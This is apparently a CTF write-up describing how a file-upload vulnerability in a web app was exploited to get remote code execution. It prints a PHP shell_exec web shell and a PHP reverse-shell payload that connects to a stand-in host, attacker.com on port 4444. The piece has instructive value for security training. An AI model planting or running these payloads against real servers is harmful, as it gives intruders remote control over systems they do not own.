Title: Remote Code Execution (RCE) Attack on a Web Server

During a CTF competition, I encountered a vulnerable web application that allowed users to upload files to the server. Given the potential security risks associated with file uploads, I suspected that the application might be vulnerable to Remote Code Execution (RCE), a type of vulnerability that allows attackers to execute code on a remote server.

To test for RCE, I crafted a malicious payload containing a PHP script that would execute the Linux command ls -la and save the output to a file, such as <?php echo shell_exec('ls -la > /var/www/html/uploads/output.txt'); ?>. I then uploaded the file to the application's server and waited for it to execute.

Upon checking the application's upload directory, I found that the output.txt file had been created and contained the expected output of the ls -la command. This confirmed the presence of an RCE vulnerability.

To obtain the flag for the Web Exploitation challenge, I needed to use the RCE vulnerability to execute a reverse shell on the remote server. After researching the application's system and network configuration, I crafted a suitable payload containing a reverse shell script that would allow me to connect to the server and gain remote access, such as <?php system('bash -i >& /dev/tcp/attacker.com/4444 0>&1'); ?>.

After executing the payload, I successfully gained a remote shell on the server and was able to complete the Web Exploitation challenge.

This CTF writeup highlights the importance of properly securing web applications against Remote Code Execution vulnerabilities by implementing proper input validation and output encoding controls, using secure file uploads, and validating user input. By exploiting the vulnerability, I was able to execute arbitrary code on the remote server, gain remote access, and complete the Web Exploitation challenge.
